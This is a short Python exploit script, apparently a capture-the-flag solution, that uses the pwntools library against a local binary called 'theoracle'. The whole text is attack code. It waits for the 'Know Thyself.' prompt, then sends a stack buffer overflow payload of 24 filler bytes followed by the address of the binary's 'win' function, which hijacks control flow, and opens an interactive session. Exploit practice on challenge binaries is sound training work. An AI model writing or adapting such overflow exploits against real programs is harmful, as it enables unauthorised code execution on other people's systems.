from pwn import *

elf = ELF('./theoracle')

p = process('./theoracle')

p.recvuntil('Know Thyself.\n')
payload = 'A' * 24 + p64(elf.sym['win'])
p.sendline(payload)
p.interactive()
p.close()